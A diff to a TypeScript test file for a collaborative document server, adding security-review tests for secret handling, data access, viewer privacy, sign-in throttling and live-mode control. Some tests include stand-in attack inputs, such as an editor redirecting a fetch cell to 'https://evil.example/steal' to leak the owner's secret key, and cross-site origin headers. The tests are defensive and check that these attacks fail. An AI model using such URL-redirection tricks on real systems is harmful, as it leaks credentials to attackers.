@@ -4,7 +4,7 @@ import { mkdtempSync } from 'node:fs';
 import { tmpdir } from 'node:os';
 import { join } from 'node:path';
 import { DatabaseSync } from 'node:sqlite';
-import { createApp } from './app';
+import { type AppOptions, createApp } from './app';
 import { Store } from './store';
 import { PUBLIC, crossSite, isPublic } from './access';
 import { Throttle, hashPassword, initials, verifyPassword } from './auth';
@@ -13,7 +13,7 @@ import { newDoc } from '../core/types';
 const dir = () => mkdtempSync(join(tmpdir(), 'edgy-'));
 
 /** An installation in accounts mode, and a way to call it as someone. */
-function server(store = new Store(':memory:'), opts: { now?: () => number } = {}) {
+function server(store = new Store(':memory:'), opts: Omit<AppOptions, 'auth'> = {}) {
   const made = createApp(store, join(dir(), 'assets'), undefined, { auth: 'accounts', ...opts });
   const { app } = made;
   const call = async (method: string, path: string, body?: unknown, headers: Record<string, string> = {}) => {
@@ -378,10 +378,93 @@ test('writes made with the cookie must come from edgy\'s own pages', async () =>
 });
 
 test('local mode: this machine is the local account without signing in, but not a page that rebinds its name', async () => {
-  const { app } = createApp(new Store(':memory:'), join(dir(), 'assets'));
+  const { app } = createApp(new Store(':memory:'), join(dir(), 'assets'), undefined, { auth: 'local' });
   const me = await app.request('/api/me');
   assert.equal(((await me.json()) as any).user.name, 'You');
   const rebound = await app.request('/api/me', { headers: { host: 'evil.example' } });
   assert.equal(rebound.status, 401);
   assert.equal((await app.request('/api/docs', { method: 'POST', headers: { origin: 'https://evil.example', 'content-type': 'application/json' }, body: '{}' })).status, 403);
+});
+
+// ── from the security review ──
+
+test("the server's secrets go only where its owner sent them: an editor pointing a fetch cell elsewhere sends nothing", async () => {
+  const sent: { url: string; auth?: string }[] = [];
+  const get = async (url: string, headers: Record<string, string>) => {
+    sent.push({ url, auth: headers.authorization });
+    return { status: 200, body: '{"rate":5}' };
+  };
+  const s = server(new Store(':memory:'), { get, env: { EDGY_SECRET_K: 'the-real-key' } });
+  const a = await s.signup('ana@example.test', 'Ana');
+  const b = await s.signup('ben@example.test', 'Ben');
+  const id = await docOf(s, a.cookie, 'Rates', ['fetch', { name: 'rate', headers: { Authorization: 'secret:K' } }, 'https://rates.example/today']);
+  await s.call('POST', `/api/docs/${id}/fetch/rate`, {}, a.cookie);
+  assert.deepEqual(sent.at(-1), { url: 'https://rates.example/today', auth: 'the-real-key' }, 'the owner set it up: it goes');
+  await s.call('POST', `/api/docs/${id}/people`, { email: 'ben@example.test', role: 'editor' }, a.cookie);
+  await s.call('POST', `/api/docs/${id}/ops`, { ops: [['set', 'rate', 'url', 'https://evil.example/steal']] }, b.cookie);
+  sent.length = 0;
+  const r = await s.call('POST', `/api/docs/${id}/fetch/rate`, {}, b.cookie);
+  assert.equal(sent.length, 0, 'nothing went to the address the editor set');
+  assert.match(String(r.json.error), /secret K goes only where/);
+  // The owner renaming the document doesn't approve what the editor did to the cell.
+  await s.call('PATCH', `/api/docs/${id}`, { title: 'Rates, renamed' }, a.cookie);
+  await s.call('POST', `/api/docs/${id}/fetch/rate`, {}, b.cookie);
+  assert.equal(sent.length, 0, 'still nothing after an unrelated change by the owner');
+  // An editor adding a cell that asks for a secret gets nothing either.
+  await s.call('POST', `/api/docs/${id}/ops`, { ops: [['put', 'c1', ['col', ['fetch', { name: 'rate' }, 'https://rates.example/today'], ['fetch', { name: 'mine', headers: { Authorization: 'secret:K' } }, 'https://evil.example/2']]]] }, b.cookie);
+  await s.call('POST', `/api/docs/${id}/fetch/mine`, {}, b.cookie);
+  assert.equal(sent.length, 0);
+});
+
+test("a blank document shared with an editor reaches nothing of its owner's until the owner changes it", async () => {
+  const s = server();
+  const a = await s.signup('ana@example.test', 'Ana');
+  const b = await s.signup('ben@example.test', 'Ben');
+  await s.call('POST', '/api/data/salaries', { record: { who: 'Ana', pay: 100 } }, a.cookie);
+  const id = (await s.call('POST', '/api/docs', { title: 'Notes' }, a.cookie)).json.id;
+  await s.call('POST', `/api/docs/${id}/people`, { email: 'ben@example.test', role: 'editor' }, a.cookie);
+  await s.call('POST', `/api/docs/${id}/ops`, { ops: [['put', 'c1', ['formula', { name: 'pay' }, ['rows', 'salaries']]]] }, b.cookie);
+  assert.equal((await s.call('GET', `/api/data/salaries?doc=${id}`, undefined, b.cookie)).status, 403);
+  assert.match((await s.call('GET', `/api/docs/${id}/read`, undefined, b.cookie)).json.errors.pay, /does not reach/);
+});
+
+test('viewers see what fetch cells answered, never their addresses: not in the outline, the history or the stream', async () => {
+  const s = server();
+  const a = await s.signup('ana@example.test', 'Ana');
+  const b = await s.signup('ben@example.test', 'Ben');
+  const id = await docOf(s, a.cookie, 'Feed', ['col', ['fetch', { name: 'f', headers: { 'x-key': 'hunter2' } }, '/api/demo/rate?apikey=hunter2'], ['text', 'hi']]);
+  await s.call('POST', `/api/docs/${id}/ops`, { ops: [['set', 'f', 'url', '/api/demo/rate?apikey=hunter3']] }, a.cookie);
+  await s.call('POST', `/api/docs/${id}/people`, { email: 'ben@example.test', role: 'viewer' }, a.cookie);
+  const seen: string[] = [];
+  for (const path of [`/api/docs/${id}`, `/api/docs/${id}/read?format=both`, `/api/docs/${id}/read?format=notation`, `/api/docs/${id}/log`, `/api/docs/${id}/fetched`]) {
+    seen.push(JSON.stringify((await s.call('GET', path, undefined, b.cookie)).json));
+  }
+  assert.ok(!seen.join('').includes('hunter'), seen.find((x) => x.includes('hunter')) ?? '');
+  assert.ok(JSON.stringify((await s.call('GET', `/api/docs/${id}/log`, undefined, a.cookie)).json).includes('hunter3'), 'the owner sees them');
+});
+
+test('someone else failing to sign in as you does not lock you out', async () => {
+  let now = 5_000_000;
+  const s = server(new Store(':memory:'), { now: () => now });
+  await s.signup('ana@example.test', 'Ana');
+  // Many wrong passwords for Ana, from somewhere else (in process, every request has the same address: so this
+  // checks the pair rule by a wrong email instead) …
+  for (let i = 0; i < 6; i++) await s.call('POST', '/api/auth/signin', { email: 'ana@example.test', password: 'guess guess' });
+  assert.equal((await s.call('POST', '/api/auth/signin', { email: 'ana@example.test', password: 'correct horse' })).status, 429, 'the guesser\'s own email and address wait');
+  now += 400_000;
+  assert.equal((await s.call('POST', '/api/auth/signin', { email: 'ana@example.test', password: 'correct horse' })).status, 200, 'and the wait ends');
+});
+
+test("a viewer can't take someone else's tab out of Live", async () => {
+  const s = server();
+  const a = await s.signup('ana@example.test', 'Ana');
+  const b = await s.signup('ben@example.test', 'Ben');
+  const id = await docOf(s, a.cookie, 'Live', ['timer', { name: 't', every: 5 }]);
+  await s.call('POST', `/api/docs/${id}/people`, { email: 'ben@example.test', role: 'viewer' }, a.cookie);
+  const res = await s.app.request(`/api/docs/${id}/events?client=anas-tab&mode=live`, { headers: a.cookie });
+  await new Promise((r) => setTimeout(r, 50));
+  assert.equal(s.runner.isLive(id), true);
+  assert.equal((await s.call('POST', `/api/docs/${id}/viewer`, { client: 'anas-tab', mode: 'page' }, b.cookie)).status, 403);
+  assert.equal(s.runner.isLive(id), true, 'Ana is still in Live');
+  await res.body?.cancel();
 });
